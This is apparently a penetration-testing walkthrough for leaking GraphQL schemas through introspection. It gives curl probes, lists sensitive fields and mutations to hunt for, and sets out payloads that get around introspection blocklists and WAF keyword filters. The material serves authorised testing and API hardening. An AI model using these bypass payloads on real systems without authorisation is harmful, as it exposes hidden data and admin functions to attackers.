# Introspection — Schema Leak Walkthrough

## Manual probe

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

Full dump: use `scripts/gql_introspection.py --endpoint <url>` or the graphql_audit.sh
phase 1. Pipe a full schema into InQL or graphql-voyager.

## What to look for in the schema

- Mutations: `updateUser`, `deleteAccount`, `changeEmail`, `changePassword`
- Queries returning other users' objects: `user(id: X)`, `order(id: X)`
- Fields: `internalNote`, `adminOnly`, `role`, `isAdmin`, `rawPassword`, `apiKey`
- Types: `AdminUser`, `InternalConfig`, `DebugInfo`
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks

## Introspection bypass techniques

When `__schema` is blocked, try:

```bash
# Newline injection (bypasses naive keyword filters)
{"query": "query {\n  __schema\n  { queryType { name } } }"}

# Fragment trick
{"query": "fragment f on __Schema { queryType { name } } { ...f }"}

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

# Over WebSocket (GraphQL subscriptions) — different code path
```

## WAF bypass

```bash
# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'
```
